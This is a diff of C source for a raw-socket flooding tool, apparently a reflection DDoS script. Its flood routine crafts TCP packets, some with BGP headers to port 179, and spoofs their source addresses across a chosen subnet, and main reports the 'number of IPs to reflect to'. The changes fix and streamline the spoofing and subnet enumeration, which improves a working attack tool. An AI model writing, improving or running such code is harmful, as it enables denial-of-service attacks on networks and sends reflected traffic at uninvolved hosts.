@@ -306,11 +306,10 @@ void *flood(void *par1)
 		tcph->check = 0;
 		iph->check = 0;
 		int bpgOrDrd = randnum(0, 1);
-
+		iph->saddr = sins[sn_i].sin_addr.s_addr;
 		if (bpgOrDrd == 1)
 		{
 			bgph->type = randnum(1, 4);
-
 			setup_bgp_header(bgph);
 			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct bgp_header)) / 4;
 			tcph->dest = htons(179);
@@ -361,7 +360,6 @@ void *flood(void *par1)
 			}
 		}
 
-		iph->saddr = sins[sn_i].sin_addr.s_addr;
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
 		tcph->ack_seq = randnum(10000, 99999);
@@ -369,7 +367,7 @@ void *flood(void *par1)
 		tcph->window = htons(windows[rand_cmwc() % 4]);
 
 		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
-		// printf("Dst IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));
+		//  printf("Dst IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));
 
 		pps++;
 
@@ -585,14 +583,20 @@ int main(int argc, char *argv[])
 	unsigned int mask_bits = (unsigned int)atol(bitmask);
 	unsigned int bitmaskAsUInt = createBitmask(bitmask);
 
-	char *networkAddress = ui2ip(ipAsUInt & bitmaskAsUInt),
-		 *broadcastAddress = ui2ip(ipAsUInt | ~bitmaskAsUInt);
+	char networkAddrBuf[16], broadcastAddrBuf[16];
+	strcpy(networkAddrBuf, ui2ip(ipAsUInt & bitmaskAsUInt));
+	strcpy(broadcastAddrBuf, ui2ip(ipAsUInt | ~bitmaskAsUInt));
+
+	char *networkAddress = networkAddrBuf;
+	char *broadcastAddress = broadcastAddrBuf;
+
 	unsigned long num_ips = 1;
 	for (i = 32; i > mask_bits; i--)
 	{
 		num_ips *= 2;
 	}
 
+	printf("Number of IPs to reflect to: %ld \r\n", num_ips);
 	struct sockaddr_in *sins = malloc(num_ips * sizeof(struct sockaddr_in));
 	short network_octets[4], broadcast_octets[4];
 	extractIpOctets(networkAddress, network_octets);
@@ -600,23 +604,17 @@ int main(int argc, char *argv[])
 
 	int ips = 0;
 
-	for (int a = network_octets[0]; a <= broadcast_octets[0]; a++)
+	for (int ip = ntohl(inet_addr(networkAddress)); ip <= ntohl(inet_addr(broadcastAddress)); ip++)
 	{
-		for (int b = network_octets[1]; b <= broadcast_octets[1]; b++)
-		{
-			for (int c = network_octets[2]; c <= broadcast_octets[2]; c++)
-			{
-				for (int d = network_octets[3]; d <= broadcast_octets[3]; d++)
-				{
-					sins[ips].sin_family = AF_INET;
-					char ipAddr[16];								 // String for the currently generating IP
-					snprintf(ipAddr, 16, "%d.%d.%d.%d", a, b, c, d); // Format the IP string from the individual octets
-					sins[ips].sin_addr.s_addr = inet_addr(ipAddr);	 // Set the IP address as the packet source address for this socket
-					ips++;
-					printf("%d: %s\n", ips, ipAddr);
-				}
-			}
-		}
+		struct in_addr addr;
+		addr.s_addr = htonl(ip);
+		sins[ips].sin_family = AF_INET;
+		sins[ips].sin_addr = addr;
+
+		char ipAddr[INET_ADDRSTRLEN];
+		inet_ntop(AF_INET, &addr, ipAddr, sizeof(ipAddr));
+		printf("%d: %s\n", ips + 1, ipAddr);
+		ips++;
 	}
 
 	int multiplier = 20;
